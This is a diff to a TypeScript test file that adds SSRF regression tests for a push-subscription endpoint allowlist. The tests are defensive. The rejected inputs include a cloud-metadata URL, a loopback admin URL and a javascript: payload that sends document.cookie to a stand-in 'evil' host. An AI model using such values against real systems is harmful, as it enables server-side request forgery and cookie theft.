@@ -85,7 +85,7 @@ describe("pushSubscriptions — auth", () => {
     const caller = createCaller(makeUnauthCtx(db) as never);
     await expect(
       caller.subscribe({
-        endpoint: "https://push.example.com/abc",
+        endpoint: "https://fcm.googleapis.com/fcm/send/abc",
         p256dh: "key",
         auth: "auth",
       }),
@@ -159,6 +159,41 @@ describe("pushSubscriptions.subscribe — upsert contract", () => {
     await expect(
       caller.subscribe({ endpoint: "not-a-url", p256dh: "k", auth: "a" }),
     ).rejects.toThrow();
+  });
+
+  // SEC-002 (SSRF): the stored endpoint is later fetch()'d by the Worker with
+  // VAPID headers. `z.string().url()` accepts ANY scheme/host, so without a
+  // host allowlist an authenticated user could register an internal/loopback
+  // endpoint and use a self-notification to make the Worker issue an
+  // attacker-directed request. Browsers only ever mint endpoints on the four
+  // vendor push services — pin to those.
+  describe("subscribe — endpoint SSRF guard (SEC-002)", () => {
+    it.each([
+      "http://169.254.169.254/latest/meta-data/",   // cloud metadata (http)
+      "http://localhost:8787/admin/notify",          // loopback
+      "https://evil.example.com/collect",            // arbitrary external host
+      "javascript:fetch('//evil/'+document.cookie)", // non-http scheme (.url() accepts it)
+      "http://fcm.googleapis.com/fcm/send/x",         // right host, bare http
+    ])("rejects %j", async (badEndpoint) => {
+      const { db } = buildUpsertDb();
+      const caller = createCaller(makeTenantOwnerCtx(db, "t_demo") as never);
+      await expect(
+        caller.subscribe({ endpoint: badEndpoint, p256dh: "k", auth: "a" }),
+      ).rejects.toMatchObject({ code: "BAD_REQUEST" });
+    });
+
+    it.each([
+      "https://fcm.googleapis.com/fcm/send/AAA",                 // Chrome/FCM
+      "https://updates.push.services.mozilla.com/wpush/v2/abc",   // Firefox
+      "https://web.push.apple.com/QAbc123",                       // Safari
+      "https://db5p.notify.windows.com/w/?token=xyz",            // Edge/WNS
+    ])("accepts real push host %j", async (goodEndpoint) => {
+      const { db, insertCalls } = buildUpsertDb();
+      const caller = createCaller(makeTenantOwnerCtx(db, "t_demo") as never);
+      const r = await caller.subscribe({ endpoint: goodEndpoint, p256dh: "k", auth: "a" });
+      expect(r).toEqual({ ok: true });
+      expect(insertCalls).toHaveLength(1);
+    });
   });
 });
 
